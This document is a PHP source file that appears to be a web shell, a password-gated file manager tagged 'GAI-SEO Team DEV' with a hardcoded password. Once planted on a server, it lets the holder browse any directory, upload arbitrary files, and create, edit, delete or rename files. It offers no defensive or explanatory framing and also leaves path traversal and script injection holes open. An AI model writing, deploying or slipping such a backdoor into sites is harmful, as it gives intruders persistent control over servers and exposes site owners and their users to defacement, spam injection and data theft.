<?php // GAI-SEO Team DEV
session_start();

$password = '666233';

if (isset($_GET['logout'])) {
    unset($_SESSION['authenticated']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['login_password']) && $_POST['login_password'] === $password) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF'] . "?" . $_SERVER['QUERY_STRING']);
        exit;
    } else {
        echo "<form method='POST'>";
        echo "<h2>Password Protected</h2>";
        echo "<input type='password' name='login_password' placeholder='Enter Password'>";
        echo "<input type='submit' value='Login'>";
        echo "</form>";
        exit;
    }
}

// 当前目录
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

function handleUpload($directory) {
    if ($_FILES) {
        $targetFile = $directory . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        $message = move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)
            ? "<p>File uploaded successfully.</p>"
            : "<p>Error uploading file.</p>";
        echo $message;
    }
}

function handleCreateFolder($directory) {
    if ($_POST['folderName']) {
        $newFolder = $directory . DIRECTORY_SEPARATOR . $_POST['folderName'];
        $message = !is_dir($newFolder)
            ? (mkdir($newFolder) ? "<p>Folder created successfully.</p>" : "<p>Error creating folder.</p>")
            : "<p>Folder already exists.</p>";
        echo $message;
    }
}

function handleCreateFile($directory) {
    if ($_POST['fileName']) {
        $newFile = $directory . DIRECTORY_SEPARATOR . $_POST['fileName'];
        $message = !file_exists($newFile)
            ? (file_put_contents($newFile, '') !== false ? "<p>File created successfully.</p>" : "<p>Error creating file.</p>")
            : "<p>File already exists.</p>";
        echo $message;
    }
}

function handleEditFile($filePath) {
    if ($_POST['content']) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p>File saved successfully.</p>";
    }

    $content = file_get_contents($filePath);
    echo "<form method='POST'>";
    echo "<textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>";
    echo "<input type='submit' value='Save'>";
    echo "</form>";
}

function handleDeleteFile($filePath) {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p>File deleted successfully.</p>";
    }
}

function handleRenameFile($filePath) {
    if ($_POST['newName']) {
        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['newName'];
        rename($filePath, $newPath);
        echo "<p>File renamed successfully.</p>";
    }
}

function displayDirectory($directory) {
    $files = array_diff(scandir($directory), array('.', '..'));
    echo "<div><h3>Files in '$directory'</h3><ul>";

    foreach ($files as $file) {
        $path = realpath("$directory/$file");
        $style = getFileStatus($path);
        $isDir = is_dir($path) ? 'directory' : 'file';

        echo "<li class='$isDir' style='$style'>";
        echo $isDir === 'directory'
            ? "<a href='?dir=$path'>$file</a>"
            : "$file - " . generateFileActions($directory, $file);
        echo "</li>";
    }
    echo "</ul></div>";
}

function getFileStatus($path) {
    if (is_writable($path) && is_readable($path)) {
        return "border-left: 4px solid green;";
    } elseif (!is_writable($path)) {
        return "border-left: 4px solid red;";
    } elseif (is_readable($path)) {
        return "border-left: 4px solid white;";
    }
    return "";
}

function generateFileActions($directory, $file) {
    return 
        "<a href='?dir=$directory&action=edit&file=$file'>Edit</a> | 
        <a href='?dir=$directory&action=delete&file=$file'>Delete</a> | 
        <a href='?dir=$directory&action=rename&file=$file'>Rename</a>";
}

function handleFileActions($filePath) {
    if (isset($_GET['action'])) {
        switch ($_GET['action']) {
            case 'edit':
                handleEditFile($filePath);
                break;
            case 'delete':
                handleDeleteFile($filePath);
                break;
            case 'rename':
                handleRenameFile($filePath);
                break;
            default:
                break;
        }
    }
}

echo "<p>Current Directory: <strong>$currentDir</strong></p>";
echo "<p><a href='?dir=" . dirname($currentDir) . "'>Go up</a></p>";
echo "<p><a href='?logout=1'>Logout</a></p>";

if (isset($_GET['action'])) {
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['file'];
    handleFileActions($filePath);
}

displayDirectory($currentDir);

// File upload form
echo "<h3>Upload File</h3><form method='POST' enctype='multipart/form-data'>";
echo "<input type='file' name='file'>";
echo "<input type='submit' value='Upload'>";
echo "</form>";

// Create folder form
echo "<h3>Create Folder</h3><form method='POST'>";
echo "<input type='text' name='folderName' placeholder='Folder Name'>";
echo "<input type='submit' value='Create Folder'>";
echo "</form>";

// Create file form
echo "<h3>Create File</h3><form method='POST'>";
echo "<input type='text' name='fileName' placeholder='File Name'>";
echo "<input type='submit' value='Create File'>";
echo "</form>";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handleUpload($currentDir);
    handleCreateFolder($currentDir);
    handleCreateFile($currentDir);
}
?>
